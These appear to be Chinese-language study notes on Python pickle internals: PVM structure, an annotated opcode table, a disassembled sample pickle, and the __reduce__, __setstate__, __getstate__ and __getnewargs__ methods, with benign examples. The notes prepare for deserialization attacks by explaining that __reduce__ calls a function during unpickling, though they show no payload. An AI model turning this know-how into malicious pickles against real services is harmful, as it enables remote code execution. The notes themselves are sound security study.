[TOC]

>参考：[SecMap - 反序列化（Python） - Tr0y's Blog](https://www.tr0y.wang/2022/02/03/SecMap-unserialize-python/)
>
>[从零开始python反序列化攻击：pickle原理解析 & 不用reduce的RCE姿势 - 知乎 (zhihu.com)](https://zhuanlan.zhihu.com/p/89132768)
>
>

### Python反序列化的相关库和方法

在 Python 中内置了标准库 `pickle`/`cPickle`（3.x 改名为 `_pickle`），用于序列化/反序列化的各种操作（Python 的官方文档中，称其为 封存/解封，意思其实差不多），比较常见的当然是 `dumps`（序列化）和 `loads`（反序列化）啦。其中 `pickle` 是用 Python 写的，`cPickle` 是用 C 语言写的，速度很快，但是它不允许用户从 `pickle` 派生子类。

![](https://github.com/wi1shu7/day_day_up/blob/main/daydayup.assets/image-20230924213758854.png)

另外有一点需要注意：对于我们自己定义的class，如果直接以形如`test = 1`的方式赋初值，**则这个`test`不会被打包！**解决方案是写一个`__init__`方法， 也就是这样：

![](https://github.com/wi1shu7/day_day_up/blob/main/daydayup.assets/image-20230924194235905.png)

###  PVM

要对序列化、反序列化很清楚的话，一定要了解 PVM，这背后又有非常多的细节。

首先，在调用 pickle 的时候，实际上是 `class pickle.Pickler` 和 `class pickle.Unpickler` 在起作用，而这两个类又是依靠 Pickle Virtual Machine(PVM)，在更深层对输入进行着某种操作，从而最后得到了那串复杂的结果。

PVM 由三部分组成：

1. 指令处理器：从流中读取 opcode 和参数，并对其进行解释处理。重复这个动作，直到遇到`.`这个结束符后停止（看上面的代码示例，序列化之后的结果最后是`.`）。最终留在栈顶的值将被作为反序列化对象返回。需要注意的是：
   1. opcode 是单字节的
   2. 带参数的指令用换行符（`\n`）来确定边界
2. 栈区(stack)：用 list 实现的，被用来临时存储数据、参数以及对象。
3. 内存区(memo)：用 dict 实现的，为 PVM 的整个生命周期提供存储。

![](https://github.com/wi1shu7/day_day_up/blob/main/daydayup.assets/image-20230924195131072.png)

![](https://github.com/wi1shu7/day_day_up/blob/main/daydayup.assets/image-20230924195149851.png)

最后，PVM 还有协议一说，这里的协议指定了应该采用什么样的序列化、反序列化算法。

#### PVM 协议

当前共有 6 种不同的协议可用，使用的协议版本越高，读取所生成 pickle 对象所需的 Python 版本就要越新。

1. v0 版协议是原始的“人类可读”协议，并且向后兼容早期版本的 Python
2. v1 版协议是较早的二进制格式，它也与早期版本的 Python 兼容
3. v2 版协议是在 Python 2.3 中加入的，它为存储 new-style class 提供了更高效的机制（参考 PEP 307）。
4. v3 版协议是在 Python 3.0 中加入的，它显式地支持 bytes 字节对象，不能使用 Python 2.x 解封。这是 Python 3.0-3.7 的默认协议。
5. v4 版协议添加于 Python 3.4。它支持存储非常大的对象，能存储更多种类的对象，还包括一些针对数据格式的优化（参考 PEP 3154）。它是 Python 3.8 使用的默认协议。
6. v5 版协议是在 Python 3.8 中加入的。它增加了对带外数据的支持，并可加速带内数据处理（参考 PEP 574）

### opcode

```
MARK           = b'('   # 向栈中压入一个 MARK 标记
STOP           = b'.'   # 程序结束，栈顶的一个元素作为 pickle.loads() 的返回值
POP            = b'0'   # 丢弃栈顶对象
POP_MARK       = b'1'   # discard stack top through topmost markobject
DUP            = b'2'   # duplicate top stack item
FLOAT          = b'F'   # 实例化一个 float 对象
INT            = b'I'   # 实例化一个 int 或者 bool 对象
BININT         = b'J'   # push four-byte signed int
BININT1        = b'K'   # push 1-byte unsigned int
LONG           = b'L'   # push long; decimal string argument
BININT2        = b'M'   # push 2-byte unsigned int
NONE           = b'N'   # 栈中压入 None
PERSID         = b'P'   # push persistent object; id is taken from string arg
BINPERSID      = b'Q'   # push persistent object; id is taken from stack
REDUCE         = b'R'   # 从栈上弹出两个对象，第一个对象作为参数（必须为元组），第二个对象作为函数，然后调							用该函数并把结果压回栈
STRING         = b'S'   # 实例化一个字符串对象
BINSTRING      = b'T'   # push string; counted binary string argument
SHORT_BINSTRING= b'U'   # push string; counted binary string argument < 256 bytes
UNICODE        = b'V'   # 实例化一个 UNICODE 字符串对象
BINUNICODE     = b'X'   # push Unicode string; counted UTF-8 string argument
APPEND         = b'a'   # 将栈的第一个元素 append 到第二个元素（必须为列表）中
BUILD          = b'b'   # 使用栈中的第一个元素（储存多个 属性名-属性值 的字典）对第二个元素（对象实例）进							 行属性设置，调用 __setstate__ 或 __dict__.update()
GLOBAL         = b'c'   # 获取一个全局对象或 import 一个模块（会调用 import 语句，能够引入新的包），压						  入栈
DICT           = b'd'   # 寻找栈中的上一个 MARK，并组合之间的数据为字典（数据必须有偶数个，即呈 key-						  value 对），弹出组合，弹出 MARK，压回结果
EMPTY_DICT     = b'}'   # 向栈中直接压入一个空字典
APPENDS        = b'e'   # 寻找栈中的上一个 MARK，组合之间的数据并 extends 到该 MARK 之前的一个元素（必							须为列表）中
GET            = b'g'   # 将 memo[n] 的压入栈
BINGET         = b'h'   # push item from memo on stack; index is 1-byte arg
INST           = b'i'   # 相当于 c 和 o 的组合，先获取一个全局函数，然后从栈顶开始寻找栈中的上一个 							  MARK，并组合之间的数据为元组，以该元组为参数执行全局函数（或实例化一个对象）
LONG_BINGET    = b'j'   # push item from memo on stack; index is 4-byte arg
LIST           = b'l'   # 从栈顶开始寻找栈中的上一个 MARK，并组合之间的数据为列表
EMPTY_LIST     = b']'   # 向栈中直接压入一个空列表
OBJ            = b'o'   # 从栈顶开始寻找栈中的上一个 MARK，以之间的第一个数据（必须为函数）为 									  callable，第二个到第 n 个数据为参数，执行该函数（或实例化一个对象），弹出 							  MARK，压回结果，
PUT            = b'p'   # 将栈顶对象储存至 memo[n]
BINPUT         = b'q'   # store stack top in memo; index is 1-byte arg
LONG_BINPUT    = b'r'   # store stack top in memo; index is 4-byte arg
SETITEM        = b's'   # 将栈的第一个对象作为 value，第二个对象作为 key，添加或更新到栈的第三个对象（必							须为列表或字典，列表以数字作为 key）中
TUPLE          = b't'   # 寻找栈中的上一个 MARK，并组合之间的数据为元组，弹出组合，弹出 MARK，压回结果
EMPTY_TUPLE    = b')'   # 向栈中直接压入一个空元组
SETITEMS       = b'u'   # 寻找栈中的上一个 MARK，组合之间的数据（数据必须有偶数个，即呈 key-value 对）						  并全部添加或更新到该 MARK 之前的一个元素（必须为字典）中
BINFLOAT       = b'G'   # push float; arg is 8-byte float encoding

TRUE           = b'I01\n'  # not an opcode; see INT docs in pickletools.py
FALSE          = b'I00\n'  # not an opcode; see INT docs in pickletools.py
```

>```
>ai翻译
>
>MARK = b'('           # 在堆栈上推送特殊的标记对象
>STOP = b'.'           # 每个 pickle 序列化结束时都以 STOP 结尾
>POP = b'0'            # 弹出堆栈顶部的元素
>POP_MARK = b'1'       # 弹出堆栈顶部直到最上面的标记对象
>DUP = b'2'            # 复制堆栈顶部的元素
>FLOAT = b'F'          # 推送浮点数对象；十进制字符串参数
>INT = b'I'            # 推送整数或布尔值；十进制字符串参数
>BININT = b'J'         # 推送四字节有符号整数
>BININT1 = b'K'        # 推送一字节无符号整数
>LONG = b'L'           # 推送长整数；十进制字符串参数
>BININT2 = b'M'        # 推送两字节无符号整数
>NONE = b'N'           # 推送 None
>PERSID = b'P'         # 推送持久化对象；id 从字符串参数中获取
>BINPERSID = b'Q'      # 推送持久化对象；id 从堆栈中获取
>REDUCE = b'R'         # 对堆栈上的 argtuple 应用 callable 函数
>STRING = b'S'         # 推送字符串；以 NL 结尾的字符串参数
>BINSTRING = b'T'      # 推送字符串；计数的二进制字符串参数
>SHORT_BINSTRING = b'U' # 推送字符串；长度小于 256 字节的字符串参数
>UNICODE = b'V'        # 推送 Unicode 字符串；以 raw-unicode-escaped 方式转义的字符串参数
>BINUNICODE = b'X'     # 推送字符串；计数的 UTF-8 字符串参数
>APPEND = b'a'         # 将堆栈顶部的元素添加到下面的列表中
>BUILD = b'b'          # 调用 __setstate__ 或 __dict__.update()
>GLOBAL = b'c'         # 推送 self.find_class(modname, name)；两个字符串参数
>DICT = b'd'           # 从堆栈项构建字典
>EMPTY_DICT = b'}'     # 推送空字典
>APPENDS = b'e'        # 将堆栈上最上面的切片扩展到下面的列表中
>GET = b'g'            # 从 memo 中推送堆栈上的项；索引为字符串参数
>BINGET = b'h'         # 从 memo 中推送堆栈上的项；索引为一字节参数
>INST = b'i'           # 构建并推送类实例
>LONG_BINGET = b'j'    # 从 memo 中推送堆栈上的项；索引为四字节参数
>LIST = b'l'           # 从堆栈上的顶部项构建列表
>EMPTY_LIST = b']'     # 推送空列表
>OBJ = b'o'            # 构建并推送类实例
>PUT = b'p'            # 将堆栈顶部的元素存储在 memo 中；索引为字符串参数
>BINPUT = b'q'         # 将堆栈顶部的元素存储在 memo 中；索引为一字节参数
>LONG_BINPUT = b'r'    # 将堆栈顶部的元素存储在 memo 中；索引为四字节参数
>SETITEM = b's'        # 将键值对添加到字典中
>TUPLE = b't'          # 从堆栈上的顶部项构建元组
>EMPTY_TUPLE = b')'    # 推送空元组
>SETITEMS = b'u'       # 通过添加堆栈上最上面的键值对修改字典
>BINFLOAT = b'G'       # 推送浮点数；参数为 8 字节浮点数编码
>
>TRUE = b'I01\n'       # 不是一个操作码；参见 pickletools.py 中的 INT 文档
>FALSE = b'I00\n'      # 不是一个操作码；参见 pickletools.py 中的 INT 文档
>
># Protocol 2
>PROTO = b'\x80'       # 标识 pickle 协议
>NEWOBJ = b'\x81'      # 通过将 cls.__new__ 应用于 argtuple 构建对象
>EXT1 = b'\x82'        # 从扩展注册表中推送对象；一字节索引
>EXT2 = b'\x83'        # 同上，但是两字节索引
>EXT4 = b'\x84'        # 同上，但是四字节索引
>TUPLE1 = b'\x85'      # 从堆栈顶部构建 1 元组
>TUPLE2 = b'\x86'      # 从两个最上面的堆栈项构建 2 元组
>TUPLE3 = b'\x87'      # 从三个最上面的堆栈项构建 3 元组
>NEWTRUE = b'\x88'     # 推送 True
>NEWFALSE = b'\x89'    # 推送 False
>LONG1 = b'\x8a'       # 从 < 256 字节的字符串推送长整数
>LONG4 = b'\x8b'       # 推送非常大的长整数
>
>_tuplesize2code = [EMPTY_TUPLE, TUPLE1, TUPLE2, TUPLE3]
>
># Protocol 3 (Python 3.x)
>BINBYTES = b'B'       # 推送字节；计数的二进制字符串参数
>SHORT_BINBYTES = b'C' # 推送字节；长度小于 256 字节的字符串参数
>
># Protocol 4
>SHORT_BINUNICODE = b'\x8c'  # 推送短字符串；UTF-8 长度小于 256 字节
>BINUNICODE8 = b'\x8d'       # 推送非常长的字符串
>BINBYTES8 = b'\x8e'         # 推送非常长的字节字符串
>EMPTY_SET = b'\x8f'         # 在堆栈上推送空集合
>ADDITEMS = b'\x90'          # 通过添加堆栈上最上面的项修改集合
>FROZENSET = b'\x91'         # 从堆栈上的最上面的项构建 frozenset
>NEWOBJ_EX = b'\x92'         # 类似于 NEWOBJ，但与仅关键字参数一起使用
>STACK_GLOBAL = b'\x93'      # 类似于 GLOBAL，但使用堆栈上的名称
>MEMOIZE = b'\x94'           # 将堆栈顶部的元素存储在 memo 中
>FRAME = b'\x95'             # 表示新帧的开始
>
># Protocol 5
>BYTEARRAY8 = b'\x96'        # 推送 bytearray
>NEXT_BUFFER = b'\x97'       # 推送下一个带外缓冲区
>READONLY_BUFFER = b'\x98'   # 将堆栈顶部设为只读
>
>```

### Python反序列化的过程

反序列化中主要的是栈，栈有两个部分很重要，一个是`stack`，一个是`metastack`。栈最核心的数据结构，所有的数据操作几乎都在栈上。为了应对数据嵌套，栈区分为两个部分：`stack`专注于维护**最顶层的信息**，而`metastack`维护下层的信息。这两个栈区的操作过程将在讨论MASK指令时解释。

还有一部分是存储区（`memo`），存储区可以类比内存，用于存取变量。它是一个数组，用来存储序列化过程中已经遇到的对象及其对应的序列化数据，数组的索引（下标）对应对象的 ID。它的每一个单元可以用来存储任何东西，但是说句老实话，大多数情况下我们并不需要这个存储区。

![](https://github.com/wi1shu7/day_day_up/blob/main/daydayup.assets/image-20230924214334571.png)

>在 Python 的 `pickle` 序列化和反序列化过程中，`memo` 存储区用于避免循环引用和重复序列化对象。
>
>具体作用如下：
>
>1. **避免循环引用**:
>   - Python 对象之间可能存在循环引用，即对象 A 引用了对象 B，而对象 B 又引用了对象 A。在序列化时，如果不加控制，会陷入无限递归。`memo` 存储区记录已经序列化的对象的 ID，从而避免无限递归。
>2. **避免重复序列化**:
>   - 在 pickle 中，对象可能会在多个地方被引用，如果在序列化过程中重复序列化这些对象，会浪费空间和时间。`memo` 存储区可以避免这种情况，因为它会记录已经序列化的对象，当再次遇到相同对象时，直接引用其序列化后的位置，而不是重复序列化。

>### _loads
>
>pickle内反序列化的源码中，有几个比较关键的方法`readline()`、`pop_mark()`、`pop()`
>
>![](https://github.com/wi1shu7/day_day_up/blob/main/daydayup.assets/image-20231018210055979.png)
>
>![](https://github.com/wi1shu7/day_day_up/blob/main/daydayup.assets/image-20231018210333448.png)
>
>- `readline()`的作用是读取仍未入栈的一行数据，是`opcode`后面的数据
>  ![](https://github.com/wi1shu7/day_day_up/blob/main/daydayup.assets/image-20231018211028100.png)
>- `pop_mark()`的作用是弹出`MARK`栈，将放在前序栈（`metastack`）中的栈（`stack`）数据放回栈中
>  ![](https://github.com/wi1shu7/day_day_up/blob/main/daydayup.assets/image-20231018211315803.png)
>- `stack.pop()`的作用是弹出栈中的第一个数据
>
>剩下的一些方法都能够看函数名得知作用，这三个的操作流程影响手写`opcode`，所以拿出来单说

分析一下上面的代码

![](https://github.com/wi1shu7/day_day_up/blob/main/daydayup.assets/image-20230924213916991.png)

```
b'\x80\x03c__main__\ntest\nq\x00)\x81q\x01}q\x02X\x04\x00\x00\x00testq\x03K\x01sb.'
    0: \x80 PROTO      3
    2: c    GLOBAL     '__main__ test'
   17: )    EMPTY_TUPLE
   18: \x81 NEWOBJ
   19: }    EMPTY_DICT
   20: X    BINUNICODE 'test'
   29: K    BININT1    1
   31: s    SETITEM
   32: b    BUILD
   33: .    STOP
highest protocol among opcodes = 2
```

首先`\x80`制定协议版本为`3`，然后`c`导入`__main__`中的`test`模块，然后`）`向栈中直接压入一个空元组![](https://github.com/wi1shu7/day_day_up/blob/main/daydayup.assets/0169dce8fd5162b87e28e7f0cee4117b.png)

然后`\x81`弹出栈顶的两个元素，第一个弹出的元素作为参数，第二个弹出的元素作为类，然后对该类进行初始化，再给初始化后的类压入栈中![](https://github.com/wi1shu7/day_day_up/blob/main/daydayup.assets/image-20230924214520196.png)

>```python
>class CapStr(str):
>    def __new__(cls, *args):
>        self_in_init = super().__new__(cls, *args)
>        print("__new__ id -> " + str(id(self_in_init)))
>        print("__new__ args -> " + str(args))
>        return self_in_init
>
>    def __init__(self, string):
>        print("__init__ string -> " + string)
>        print("__init__ id -> " + str(id(self)))
>
>
>a = CapStr("I love China!")
>print("a id -> " + str(id(a)))
>
>```
>
>__new__ id -> 1799333919200
>__new__ args -> ('I love China!',)
>__init__ string -> I love China!
>__init__ id -> 1799333919200
>a id -> 1799333919200

这样之后栈顶的元素就为实例化的类`test`，`}`向栈中压入一个空的字典，`X`将 Unicode 字符串`test`编码成 UTF-8 字节流并压入栈中
![](https://github.com/wi1shu7/day_day_up/blob/main/daydayup.assets/image-20231005202632907.png)

`K`向栈中压入一个一字节无符号整数，在这里也就是`1`
![](https://github.com/wi1shu7/day_day_up/blob/main/daydayup.assets/image-20231005203433609.png)

>`unpack` 函数是 Python 中 `struct` 模块提供的一个用于解析字节流的函数。`struct` 模块允许你将 Python 数据类型转换为字节流（称为"pack"）和将字节流解析为 Python 数据类型（称为"unpack"）。
>
>函数签名：
>
>```python
>struct.unpack(format, buffer)
>```
>
>- `format` 参数指定了字节流的格式，以及如何解析这个字节流。它是一个字符串，其中包含了格式化指令，用于指定字节流中数据的类型、大小和顺序。
>- `buffer` 参数是要解析的字节流，通常是一个 bytes 对象。
>
>`unpack` 函数根据指定的格式字符串解析字节流，并返回一个元组，包含解析得到的数据。格式字符串中的格式化指令告诉 `unpack` 如何解析字节流，并将解析得到的数据以元组的形式返回。
>
>例如，如果你有一个 4 字节的字节流，表示一个无符号整数（采用小端字节序），可以使用以下方式解析：
>
>```python
>import struct
>
>data = b'\x01\x00\x00\x00'  # 4-byte little-endian representation of the number 1
>unpacked_data = struct.unpack('<I', data)  # Unpack as an unsigned integer in little-endian format
>print(unpacked_data)  # Output: (1,)
>```
>
>在这个示例中，`format` 参数为 `<I`，表示小端字节序（`<`）的无符号整数（`I`）。`unpack` 函数解析字节流 `data`，将其解释为一个小端字节序的无符号整数，返回的元组中包含解析得到的数值。
>
>>小端字节序（Little Endian）是一种字节序排列方式，其中数值的低位字节存储在内存的低地址处，高位字节存储在内存的高地址处。这意味着数值的最低有效字节（最右边的字节）会存储在内存中的最低地址，而最高有效字节（最左边的字节）会存储在内存中的高地址。
>>
>>举个简单的例子，假设我们有一个 32 位整数 0x12345678（十六进制表示），在小端字节序下，它在内存中的存储方式如下：
>>
>>```
>>Address:  0x1000   0x1001   0x1002   0x1003
>>Data:     0x78     0x56     0x34     0x12
>>```
>>
>>- 地址 0x1000 存储了最低有效字节（0x78），地址递增代表字节的位置递增。
>>- 地址 0x1003 存储了最高有效字节（0x12），即整数的最高位。
>>
>>在小端字节序下，读取多字节数据时，我们先读取最低有效字节，再依次读取高位字节，即从低地址向高地址读取。
>>
>>小端字节序在许多计算机体系结构中被广泛采用，包括 x86 和 x86-64 架构等。

`s`弹出栈顶两个元素，第一个作为value，第二个作为key，添加或更新到弹出上述两个元素之后的栈顶元素中（必须为列表或字典）
![](https://github.com/wi1shu7/day_day_up/blob/main/daydayup.assets/image-20231005203832120.png)

`b`将弹出栈顶元素，然后利用该元素对弹出上述元素后的栈顶元素进行属性设置，利用`__setstate__()`(如果它存在的话就用它，不存在就用下面的)或者`__dict__`，这边就是将属性`test=1`赋给实例`test`，最后`.`结束。
![](https://github.com/wi1shu7/day_day_up/blob/main/daydayup.assets/image-20231005205154634.png)

>### `__setstate__()` 
>
>`__setstate__()` 是 Python 中用于自定义反序列化过程的特殊方法。它允许在反序列化对象时对对象进行额外的处理和初始化。
>
>当使用 Pickle 模块反序列化对象时，如果对象实现了 `__setstate__()` 方法，Pickle 将在反序列化后调用该方法，将反序列化的状态信息传递给对象，以便自定义对象的恢复过程。
>
>方法签名如下：
>```python
>def __setstate__(self, state):
>    # Custom deserialization logic
>    pass
>```
>
>- `self`：对象实例。
>- `state`：包含了反序列化的状态信息的字典或其他数据结构。
>
>开发者可以在 `__setstate__()` 方法中根据自己的需求解析传递进来的状态信息，并据此初始化对象的属性。这允许进行一些定制的初始化操作，以确保对象在反序列化后的状态是正确的。
>
>举个简单的例子：
>
>```python
>import pickle
>
>class CustomObject:
>    def __init__(self):
>        self.value = 0
>
>    def __setstate__(self, state):
>        self.value = state.get('value', 0)
>
>    def __repr__(self):
>        return f'CustomObject(value={self.value})'
>
># Serialize an instance of CustomObject
>original_object = CustomObject()
>original_object.value = 42
>serialized_object = pickle.dumps(original_object)
>
># Deserialize the object and invoke __setstate__()
>deserialized_object = pickle.loads(serialized_object)
>print(deserialized_object)  # Output: CustomObject(value=42)
>```
>
>在上面的例子中，`CustomObject` 实现了 `__setstate__()` 方法，用于在反序列化时根据传递的状态信息更新对象的属性。
>
>### `sys.intern()` 
>
>`sys.intern()` 是 Python 的内置函数，用于在 Python 字符串池中查找字符串。字符串池是一个特殊的数据结构，它保存了 Python 中所有字符串对象的唯一实例，以避免重复创建相同的字符串。
>
>具体地说，`sys.intern()` 函数接受一个字符串作为参数，它会将该字符串放入字符串池中并返回一个对该字符串的引用。如果字符串已存在于字符串池中，则返回现有的引用。这样可以确保相同内容的字符串在内存中只存在一份，从而节省内存并提高字符串比较的效率。
>
>举个例子：
>
>```python
>import sys
>
>s1 = 'hello'
>s2 = 'hello'
>
># Check if s1 and s2 point to the same object
>print(s1 is s2)  # Output: True
>
># Use sys.intern to force the strings to point to the same object in the pool
>s1 = sys.intern('hello')
>s2 = sys.intern('hello')
>
># Check if s1 and s2 point to the same object after interning
>print(s1 is s2)  # Output: True
>```
>
>在这个例子中，`sys.intern('hello')` 将字符串 'hello' 放入字符串池，并返回该字符串的引用。在后续的对同样内容的字符串进行 intern 操作后，它们都会指向字符串池中的同一个对象。
>
>这个函数通常在处理大量字符串时，特别是需要比较字符串的场景下，能够提高程序的性能。
>
>### slotstate
>
>在提供的代码中，`slotstate` 变量用于存储反序列化过程中可能的“slot state”，并在适当的情况下应用到对象实例中。
>
>“slot state” 是指对象的状态信息，通常用于描述那些无法直接通过 `__dict__` 存储的状态，例如特殊的槽位（slots）。Python 中，槽位是一种在类定义中用于存储属性的机制，与常规的 `__dict__` 不同。
>
>在反序列化对象时，有时候对象的状态信息可能不仅仅通过 `__dict__` 存储，可能还依赖于类定义中的槽位（slots）等其他机制。`slotstate` 用于存储这些额外的状态信息，以确保对象在反序列化后完全恢复到正确的状态。
>
>具体来说，这段代码的逻辑如下：
>
>1. 首先，尝试从状态信息中解析出 `slotstate`（如果存在）。
>2. 然后，如果有 `state`，将 `state` 的内容应用到对象的 `__dict__` 中。
>3. 最后，如果有 `slotstate`，将 `slotstate` 中的内容通过 `setattr()` 函数应用到对象实例中。
>
>这样，可以确保对象的状态信息完整地被恢复，无论是通过普通属性 (`__dict__`) 还是特殊的槽位（slots）存储。

### 相关魔术方法

#### `__reduce__()`

opcode中的`R`就是`__reduce__()`，他干了这件事

- 取当前栈的栈顶记为`args`，然后把它弹掉。
- 取当前栈的栈顶记为`f`，然后把它弹掉。
- 以`args`为参数，执行函数`f`，把结果压进当前栈。

class的`__reduce__`方法，在pickle反序列化的时候会被执行。其底层的编码方法，就是利用了`R`指令码。 `f`要么返回字符串，要么返回一个tuple，后者对我们而言更有用（返回的对象通常称为 “reduce 值”）。

如果返回字符串，该字符串会被当做一个全局变量的名称。它应该是对象相对于其模块的本地名称，pickle 模块会搜索模块命名空间来确定对象所属的模块。这种行为常在单例模式使用。**（复现不出来）**

如果返回的是元组，则应当包含 2 到 6 个元素，可选元素可以省略或设置为 None。每个元素代表的意义如下：

1. 一个可调用对象，该对象会在创建对象的最初版本时调用。
2. 可调用对象的参数，是一个元组。如果可调用对象不接受参数，必须提供一个空元组。
3. 可选元素，用于表示对象的状态，将被传给前述的 `__setstate__()` 方法。如果对象没有此方法，则这个元素必须是字典类型，并会被添加至 `__dict__` 属性中。
4. 可选元素，一个返回连续项的迭代器（而不是序列）。这些项会被 `obj.append(item)` 逐个加入对象，或被 `obj.extend(list_of_items)` 批量加入对象。这个元素主要用于 list 的子类，也可以用于那些正确实现了 `append()` 和 `extend()` 方法的类。（具体是使用 `append()` 还是 `extend()` 取决于 pickle 协议版本以及待插入元素的项数，所以这两个方法必须同时被类支持）
5. 可选元素，一个返回连续键值对的迭代器（而不是序列）。这些键值对将会以 `obj[key] = value` 的方式存储于对象中。该元素主要用于 dict 子类，也可以用于那些实现了 `__setitem__()` 的类。
6. 可选元素，一个带有 `(obj, state)` 签名的可调用对象。该可调用对象允许用户以编程方式控制特定对象的状态更新行为，而不是使用 obj 的静态 `__setstate__()` 方法。如果此处不是 None，则此可调用对象的优先级高于 obj 的 `__setstate__()`。

可以看出，其实 pickle 并不直接调用上面的几个函数。事实上，它们实现了 `__reduce__()` 这一特殊方法。尽管这个方法功能很强，但是直接在类中实现 `__reduce__()` 容易产生错误。因此，设计类时应当尽可能的使用高级接口（比如 `__getnewargs_ex__()`、`__getstate__()` 和 `__setstate__()`）。后面仍然可以看到直接实现 `__reduce__()` 接口的状况，可能别无他法，可能为了获得更好的性能，或者两者皆有之。

>##### `__reduce_ex__()`
>
>作为替代选项，也可以实现 `__reduce_ex__()` 方法。此方法的唯一不同之处在于它接受一个整型参数用于指定协议版本。如果定义了这个函数，则会覆盖 `__reduce__()` 的行为。此外，`__reduce__()` 方法会自动成为扩展版方法的同义词。这个函数主要用于为以前的 Python 版本提供向后兼容的 reduce 值。

#### `__setstate__()` 

`__setstate__()` 是 Python 中用于自定义反序列化过程的特殊方法。它允许在反序列化对象时对对象进行额外的处理和初始化。

当使用 Pickle 模块反序列化对象时，如果对象实现了 `__setstate__()` 方法，Pickle 将在反序列化后调用该方法，将反序列化的状态信息传递给对象，以便自定义对象的恢复过程。

方法签名如下：

```python
def __setstate__(self, state):
    # Custom deserialization logic
    pass
```

- `self`：对象实例。
- `state`：包含了反序列化的状态信息的字典或其他数据结构。

开发者可以在 `__setstate__()` 方法中根据自己的需求解析传递进来的状态信息，并据此初始化对象的属性。这允许进行一些定制的初始化操作，以确保对象在反序列化后的状态是正确的。

举个简单的例子：

```python
import pickle

class CustomObject:
    def __init__(self):
        self.value = 0

    def __setstate__(self, state):
        self.value = state.get('value', 0)

    def __repr__(self):
        return f'CustomObject(value={self.value})'

# Serialize an instance of CustomObject
original_object = CustomObject()
original_object.value = 42
serialized_object = pickle.dumps(original_object)

# Deserialize the object and invoke __setstate__()
deserialized_object = pickle.loads(serialized_object)
print(deserialized_object)  # Output: CustomObject(value=42)
```

在上面的例子中，`CustomObject` 实现了 `__setstate__()` 方法，用于在反序列化时根据传递的状态信息更新对象的属性。

#### `__getstate__()`

类还可以进一步控制实例的封存过程。如果类定义了 `__getstate__()`，它就会被调用，其返回的对象是被当做实例内容来封存的，否则封存的是实例的 `__dict__`。如果 `__getstate__()` 未定义，实例的 `__dict__` 会被照常封存

`__getstate__()` 是一个特殊方法，用于自定义对象的序列化过程。当你使用 Python 的 `pickle` 模块或其他序列化工具来将对象转换为字节流时，`__getstate__()` 方法会被调用。

在默认情况下，`pickle` 会尝试序列化对象的所有属性。但是，有时你可能希望控制哪些属性被序列化，或者在序列化过程中进行一些额外的处理。

通过在你的对象中实现 `__getstate__()` 方法，你可以自定义对象的序列化行为。`__getstate__()` 方法应该返回一个字典，其中包含你希望序列化的属性和对应的值。只有在返回的字典中的属性才会被序列化。

下面是一个示例，展示了如何使用 `__getstate__()` 方法来控制对象的序列化过程：

```python
import pickle

class Point:
    def __init__(self, x, y):
        self.x = x
        self.y = y

    def __getstate__(self):
        state = self.__dict__.copy()
        # 不序列化 y 属性
        del state['y']
        return state

    def __setstate__(self, state):
        self.__dict__.update(state)

point = Point(1, 2)

# 序列化对象
serialized = pickle.dumps(point)

# 反序列化对象
deserialized = pickle.loads(serialized)

print(deserialized.x)  # 输出: 1
print(deserialized.y)  # 抛出 AttributeError: 'Point' object has no attribute 'y'
```

在上面的示例中，我们在 `__getstate__()` 方法中删除了 `y` 属性，因此在序列化过程中只有 `x` 属性被保存。在反序列化后，我们可以看到 `y` 属性不存在。

总结起来，通过实现 `__getstate__()` 方法，你可以自定义对象的序列化过程，选择性地序列化属性，并在序列化过程中进行额外的处理。这使得你能够更好地控制对象的序列化行为。

#### `__getnewargs__()`

`__getnewargs__()` 方法是 Python 中的一个特殊方法，用于与 `__new__()` 方法配合，自定义对象的序列化和反序列化行为。序列化是将对象的状态转换为字节流的过程，而反序列化是从字节流中重建对象的过程。

当对象被序列化时，会调用 `__getnewargs__()` 方法来确定在反序列化过程中传递给对象的 `__new__()` 方法的参数。这样可以控制对象在反序列化时的重建方式。

下面是一个示例，演示了 `__getnewargs__()` 方法的用法：

```python
import pickle

class Point:
    def __init__(self, x, y):
        self.x = x
        self.y = y

    def __getnewargs__(self):
        return (self.x, self.y)

    def __new__(cls, x, y):
        return super().__new__(cls)

    def __repr__(self):
        return f"Point({self.x}, {self.y})"

# 创建一个 Point 对象
p1 = Point(1, 2)
print(p1)  # 输出: Point(1, 2)

# 序列化对象
data = pickle.dumps(p1)

# 反序列化对象
p2 = pickle.loads(data)
print(p2)  # 输出: Point(1, 2)
```

在上面的示例中，`Point` 类定义了 `__getnewargs__()` 方法，它返回包含参数 `(self.x, self.y)` 的元组。在反序列化过程中，将使用这些参数调用 `__new__()` 方法来创建 `Point` 类的新实例。

如果未定义 `__getnewargs__()` 方法，那么`__new__()`方法不会被传入任何参数

```python
import pickle

class Point:
    def __init__(self, x, y):
        self.x = x
        self.y = y

  # def __getnewargs__(self):
      # return (self.x, self.y)

    def __new__(cls, x, y):
        return super().__new__(cls)

    def __repr__(self):
        return f"Point({self.x}, {self.y})"

# 创建一个 Point 对象
p1 = Point(1, 2)
print(p1) 

# 序列化对象
data = pickle.dumps(p1)

# 反序列化对象
p2 = pickle.loads(data)
print(p2)


'''
Point(1, 2)
Traceback (most recent call last):
  File "C:\Users\Lenovo\PycharmProjects\pythonProject\demo\opcode_test.py", line 69, in <module>
    p2 = pickle.loads(data)
TypeError: __new__() missing 2 required positional arguments: 'x' and 'y'
'''
```

```python
import pickle

class Point:
    def __init__(self, x, y):
        self.x = x
        self.y = y

  # def __getnewargs__(self):
      # return (self.x, self.y)

    def __new__(cls, args):
        print("__new()__  ->  " + repr(args))
        return super().__new__(cls)

    def __repr__(self):
        return f"Point({self.x}, {self.y})"

# 创建一个 Point 对象
p1 = Point(1, 2)
print(p1)

# 序列化对象
data = pickle.dumps(p1)

# 反序列化对象
p2 = pickle.loads(data)
print(p2)

'''
__new()__  ->  (1, 2)
Point(1, 2)
__new()__  ->  ()
Point(1, 2)
'''
```

>##### `__getnewargs_ex__()`
>
>限制：
>
>1. 对于使用 v2 版或更高版协议的 pickle 才能使用此方法
>2. 必须返回一对 `(args, kwargs)` 用于构建对象，其中 `args` 是表示位置参数的 tuple，而 `kwargs` 是表示命名参数的 dict
>
>`__getnewargs_ex__()` 方法 return 的值，会在解封时传给 `__new__()` 方法的作为它的参数。
>
>##### `__getnewargs__()`
>
>限制：
>
>1. 必须返回一个 tuple 类型的 `args`
>2. 如果定义了 `__getnewargs_ex__()`，那么 `__getnewargs__()` 就不会被调用。
>
>这个方法与上一个 `__getnewargs_ex__()` 方法类似，但只支持位置参数。
>
>注：在 Python 3.6 前，v2、v3 版协议会调用 `__getnewargs__()`，更高版本协议会调用 `__getnewargs_ex__()`

